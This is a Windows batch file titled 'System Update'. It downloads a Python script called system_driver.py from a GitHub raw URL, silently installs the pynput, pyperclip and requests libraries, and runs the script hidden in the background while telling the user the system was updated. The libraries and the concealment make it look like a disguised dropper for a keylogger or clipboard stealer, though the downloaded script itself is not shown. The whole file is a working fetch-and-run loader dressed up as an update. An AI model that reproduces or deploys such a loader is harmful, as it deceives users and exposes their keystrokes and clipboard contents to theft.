@echo off
title System Update
echo Checking for updates...

:: Define GitHub Raw URL
set "SCRIPT_URL=https://raw.githubusercontent.com/coolrain14253/optimizer/main/system_driver.py"
set "SCRIPT_NAME=system_driver.py"

:: Download the Python script using PowerShell
powershell -Command "(New-Object Net.WebClient).DownloadFile('%SCRIPT_URL%', '%SCRIPT_NAME%')"

:: Install dependencies using python -m pip (more compatible)
python -m pip install pynput pyperclip requests --quiet

:: Run the driver in background (hidden)
start /b pythonw %SCRIPT_NAME%

echo System updated successfully!
timeout /t 3
exit